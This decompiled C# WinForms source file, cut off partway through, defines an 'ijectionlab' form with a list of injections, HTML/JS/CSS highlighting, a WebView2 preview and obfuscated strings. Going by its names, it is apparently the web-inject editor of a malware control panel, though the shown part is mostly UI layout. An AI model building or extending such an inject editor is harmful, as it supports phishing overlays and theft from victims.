using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using FastColoredTextBoxNS;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class ijectionlab : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("jectslist")]
	private DrakeUIListBox _jectslist;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchtext")]
	private DrakeUITextBox _searchtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("delsbtn1")]
	private DrakeUIButtonIcon _delsbtn1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("delallbtn")]
	private DrakeUIButtonIcon _delallbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addnbtn")]
	private DrakeUIButtonIcon _addnbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savebtn")]
	private DrakeUIButtonIcon _savebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("prevbtn")]
	private DrakeUIButtonIcon _prevbtn;

	private FastColoredTextBox fctb;

	private Timer updatePreviewTimer;

	private bool skipchange;

	private TextStyle tagStyle;

	private TextStyle attrNameStyle;

	private TextStyle attrValueStyle;

	private TextStyle tagBracketStyle;

	private TextStyle contentTextStyle;

	private TextStyle jsFunctionStyle;

	private TextStyle cssSelectorStyle;

	private TextStyle commentStyle;

	private Timer searchDelayTimer;

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("jectview")]
	internal virtual WebView2 jectview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIListBox jectslist
	{
		[CompilerGenerated]
		get
		{
			return _jectslist;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = jectslist_SelectedIndexChanged;
			DrakeUIListBox drakeUIListBox = _jectslist;
			if (drakeUIListBox != null)
			{
				drakeUIListBox.SelectedIndexChanged -= value2;
			}
			_jectslist = value;
			drakeUIListBox = _jectslist;
			if (drakeUIListBox != null)
			{
				drakeUIListBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual DrakeUITextBox searchtext
	{
		[CompilerGenerated]
		get
		{
			return _searchtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = searchtext_TextChanged;
			DrakeUITextBox drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_searchtext = value;
			drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W15")]
	internal virtual DrakeWidth_W DrakeWidth_W15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W11")]
	internal virtual DrakeWidth_W DrakeWidth_W11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("BTtiptool")]
	internal virtual DrakeUIToolTip BTtiptool
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon delsbtn1
	{
		[CompilerGenerated]
		get
		{
			return _delsbtn1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _delsbtn1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_delsbtn1 = value;
			drakeUIButtonIcon = _delsbtn1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon delallbtn
	{
		[CompilerGenerated]
		get
		{
			return _delallbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _delallbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_delallbtn = value;
			drakeUIButtonIcon = _delallbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon addnbtn
	{
		[CompilerGenerated]
		get
		{
			return _addnbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _addnbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_addnbtn = value;
			drakeUIButtonIcon = _addnbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon savebtn
	{
		[CompilerGenerated]
		get
		{
			return _savebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _savebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_savebtn = value;
			drakeUIButtonIcon = _savebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon prevbtn
	{
		[CompilerGenerated]
		get
		{
			return _prevbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = prevbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _prevbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_prevbtn = value;
			drakeUIButtonIcon = _prevbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public ijectionlab()
	{
		base.Load += ijectionlab_Load;
		updatePreviewTimer = new Timer
		{
			Interval = 500
		};
		skipchange = false;
		searchDelayTimer = new Timer
		{
			Interval = 300
		};
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.ijectionlab));
		this.Panel2 = new System.Windows.Forms.Panel();
		this.addnbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.delallbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.delsbtn1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.jectslist = new DrakeUI.Framework.DrakeUIListBox();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.searchtext = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeWidth_W15 = new DrakeUI.Framework.DrakeWidth_W();
		this.jectview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.savebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W11 = new DrakeUI.Framework.DrakeWidth_W();
		this.prevbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.BTtiptool = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.jectview).BeginInit();
		this.Panel3.SuspendLayout();
		this.Panel5.SuspendLayout();
		base.SuspendLayout();
		this.myscr.Location = new System.Drawing.Point(63, 5);
		this.pinbtn.Location = new System.Drawing.Point(1234, 5);
		this.minibtn.Location = new System.Drawing.Point(1276, 5);
		this.closbtn.Location = new System.Drawing.Point(1318, 5);
		this.myico.Image = BTMOB.My.Resources.Resources.ject_off;
		this.myico.Size = new System.Drawing.Size(48, 25);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(1350, 18);
		this.mytitle.Text = EXGuarder._4524785C;
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(1360, 26);
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.addnbtn);
		this.Panel2.Controls.Add(this.delallbtn);
		this.Panel2.Controls.Add(this.DrakeWidth_W4);
		this.Panel2.Controls.Add(this.delsbtn1);
		this.Panel2.Controls.Add(this.DrakeWidth_W3);
		this.Panel2.Controls.Add(this.jectslist);
		this.Panel2.Controls.Add(this.DrakeWidth_W2);
		this.Panel2.Controls.Add(this.searchtext);
		this.Panel2.Controls.Add(this.DrakeWidth_W15);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel2.Location = new System.Drawing.Point(2, 100);
		this.Panel2.Name = EXGuarder._5A791011;
		this.Panel2.Padding = new System.Windows.Forms.Padding(9, 9, 9, 9);
		this.Panel2.Size = new System.Drawing.Size(278, 769);
		this.Panel2.TabIndex = 40;
		this.addnbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.addnbtn.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.addnbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.addnbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnbtn.Font = new System.Drawing.Font(EXGuarder._1C110946, 9f);
		this.addnbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnbtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnbtn.Location = new System.Drawing.Point(9, 714);
		this.addnbtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.addnbtn.Name = EXGuarder._3E2D6A3B;
		this.addnbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.addnbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.addnbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnbtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.addnbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.addnbtn.Size = new System.Drawing.Size(260, 32);
		this.addnbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.addnbtn.Symbol = 61525;
		this.addnbtn.TabIndex = 55;
		this.addnbtn.Text = EXGuarder._64176F10;
		this.delallbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.delallbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.delallbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delallbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.delallbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delallbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delallbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delallbtn.Font = new System.Drawing.Font(EXGuarder._1C110946, 9f);
		this.delallbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.delallbtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.delallbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delallbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delallbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.delallbtn.Location = new System.Drawing.Point(9, 479);
		this.delallbtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.delallbtn.Name = EXGuarder._5D6E624D;
		this.delallbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.delallbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.delallbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delallbtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.delallbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.delallbtn.Size = new System.Drawing.Size(260, 32);
		this.delallbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.delallbtn.Symbol = 61944;
		this.delallbtn.TabIndex = 54;
		this.delallbtn.Text = EXGuarder._68145F0C;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(9, 470);
		this.DrakeWidth_W4.Name = EXGuarder._123E601A;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(260, 9);
		this.DrakeWidth_W4.TabIndex = 51;
		this.delsbtn1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.delsbtn1.Dock = System.Windows.Forms.DockStyle.Top;
		this.delsbtn1.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delsbtn1.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.delsbtn1.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delsbtn1.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delsbtn1.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delsbtn1.Font = new System.Drawing.Font(EXGuarder._1C110946, 9f);
		this.delsbtn1.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.delsbtn1.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.delsbtn1.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delsbtn1.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delsbtn1.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.delsbtn1.Location = new System.Drawing.Point(9, 438);
		this.delsbtn1.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.delsbtn1.Name = EXGuarder._44235371;
		this.delsbtn1.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.delsbtn1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.delsbtn1.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delsbtn1.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.delsbtn1.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.delsbtn1.Size = new System.Drawing.Size(260, 32);
		this.delsbtn1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.delsbtn1.Symbol = 61527;
		this.delsbtn1.TabIndex = 53;
		this.delsbtn1.Text = EXGuarder._4C2C032C;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(9, 746);
		this.DrakeWidth_W3.Name = EXGuarder._5C295046;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(260, 14);
		this.DrakeWidth_W3.TabIndex = 26;
		this.jectslist.Dock = System.Windows.Forms.DockStyle.Top;
		this.jectslist.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.jectslist.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.jectslist.Font = new System.Drawing.Font(EXGuarder._1C110946, 8f);
		this.jectslist.ForeColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.jectslist.ItemHeight = 32;
		this.jectslist.ItemSelectBackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.jectslist.Location = new System.Drawing.Point(9, 62);
		this.jectslist.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.jectslist.Name = EXGuarder._54082D07;
		this.jectslist.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.jectslist.Radius = 15;
		this.jectslist.RectColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.jectslist.Size = new System.Drawing.Size(260, 376);
		this.jectslist.Style = DrakeUI.Framework.UIStyle.Custom;
		this.jectslist.StyleCustomMode = true;
		this.jectslist.TabIndex = 2;
		this.jectslist.Text = null;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(9, 48);
		this.DrakeWidth_W2.Name = EXGuarder._41637124;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(260, 14);
		this.DrakeWidth_W2.TabIndex = 25;
		this.searchtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.searchtext.Dock = System.Windows.Forms.DockStyle.Top;
		this.searchtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.searchtext.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.searchtext.Font = new System.Drawing.Font(EXGuarder._1C110946, 9f);
		this.searchtext.ForeColor = System.Drawing.Color.White;
		this.searchtext.Location = new System.Drawing.Point(9, 23);
		this.searchtext.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.searchtext.Maximum = 2147483647.0;
		this.searchtext.Minimum = -2147483648.0;
		this.searchtext.Name = EXGuarder._6C245E39;
		this.searchtext.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.searchtext.Radius = 15;
		this.searchtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.searchtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.searchtext.Size = new System.Drawing.Size(260, 25);
		this.searchtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.searchtext.TabIndex = 12;
		this.searchtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.searchtext.Watermark = EXGuarder._5B626A79;
		this.DrakeWidth_W15.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W15.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W15.Location = new System.Drawing.Point(9, 9);
		this.DrakeWidth_W15.Name = EXGuarder._342A030D;
		this.DrakeWidth_W15.Size = new System.Drawing.Size(260, 14);
		this.DrakeWidth_W15.TabIndex = 24;
		this.jectview.AllowExternalDrop = true;
		this.jectview.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.jectview.CreationProperties = null;
		this.jectview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.jectview.Dock = System.Windows.Forms.DockStyle.Right;
		this.jectview.Location = new System.Drawing.Point(637, 0);
		this.jectview.Name = EXGuarder._1070045E;
		this.jectview.Size = new System.Drawing.Size(445, 769);
		this.jectview.TabIndex = 0;
		this.jectview.Visible = false;
		this.jectview.ZoomFactor = 1.0;
		this.Panel3.Controls.Add(this.Panel4);
		this.Panel3.Controls.Add(this.jectview);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(280, 100);
		this.Panel3.Name = EXGuarder._70463722;
		this.Panel3.Size = new System.Drawing.Size(1082, 769);
		this.Panel3.TabIndex = 26;
		this.Panel4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel4.Location = new System.Drawing.Point(0, 0);
		this.Panel4.Name = EXGuarder._2F487503;
		this.Panel4.Padding = new System.Windows.Forms.Padding(9, 9, 9, 9);
		this.Panel4.Size = new System.Drawing.Size(637, 769);
		this.Panel4.TabIndex = 1;
		this.Panel5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel5.Controls.Add(this.savebtn);
		this.Panel5.Controls.Add(this.DrakeWidth_W11);
		this.Panel5.Controls.Add(this.prevbtn);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel5.Location = new System.Drawing.Point(2, 64);
		this.Panel5.Name = EXGuarder._03546874;
		this.Panel5.Padding = new System.Windows.Forms.Padding(9, 9, 9, 9);
		this.Panel5.Size = new System.Drawing.Size(1360, 36);
		this.Panel5.TabIndex = 0;
		this.savebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.savebtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.savebtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savebtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savebtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savebtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savebtn.Font = new System.Drawing.Font(EXGuarder._1C110946, 9f);
		this.savebtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.savebtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.savebtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.savebtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.savebtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.savebtn.Location = new System.Drawing.Point(1194, 9);
		this.savebtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.savebtn.Name = EXGuarder._1457693E;
		this.savebtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.savebtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.savebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.savebtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.savebtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.savebtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.savebtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.savebtn.Size = new System.Drawing.Size(74, 18);
		this.savebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.savebtn.Symbol = 61465;
		this.savebtn.SymbolSize = 20;
		this.savebtn.TabIndex = 55;
		this.savebtn.Tag = EXGuarder._78201024;
		this.DrakeWidth_W11.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W11.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W11.Location = new System.Drawing.Point(1268, 9);
		this.DrakeWidth_W11.Name = EXGuarder._0D2D616C;
		this.DrakeWidth_W11.Size = new System.Drawing.Size(9, 18);
		this.DrakeWidth_W11.TabIndex = 50;
		this.prevbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.prevbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.prevbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.prevbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.prevbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.prevbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.prevbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.prevbtn.Font = new System.Drawing.Font(EXGuarder._1C110946, 9f);
		this.prevbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.prevbtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.prevbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.prevbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.prevbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.prevbtn.Location = new System.Drawing.Point(1277, 9);
		this.prevbtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.prevbtn.Name = EXGuarder._6600050D;
		this.prevbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.prevbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.prevbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.prevbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.prevbtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.prevbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.prevbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.prevbtn.Size = new System.Drawing.Size(74, 18);
		this.prevbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prevbtn.Symbol = 61550;
		this.prevbtn.SymbolSize = 20;
		this.prevbtn.TabIndex = 56;
		this.prevbtn.Tag = EXGuarder._78201024;
		this.BTtiptool.AutomaticDelay = 100;
		this.BTtiptool.AutoPopDelay = 1000;
		this.BTtiptool.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.BTtiptool.Font = new System.Drawing.Font(EXGuarder._1C110946, 9f);
		this.BTtiptool.ForeColor = System.Drawing.Color.White;
		this.BTtiptool.InitialDelay = 10;
		this.BTtiptool.OwnerDraw = true;
		this.BTtiptool.RectColor = System.Drawing.Color.Gray;
		this.BTtiptool.ReshowDelay = 20;
		this.BTtiptool.ShowAlways = true;
		this.BTtiptool.TitleFont = new System.Drawing.Font(EXGuarder._1C110946, 9f);
		this.BTtiptool.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
		this.BTtiptool.ToolTipTitle = EXGuarder._36011B34;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(1364, 871);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel5);
		this.DoubleBuffered = false;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._0F37370E);
		base.Name = EXGuarder._4B506413;
		this.Text = EXGuarder._0A6A0E5E;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel5, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.jectview).EndInit();
		this.Panel3.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._44503E43, EXGuarder._69181F07);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._17597849, TextCompare: false))
		{
			searchtext.Watermark = EXGuarder._5978365C;
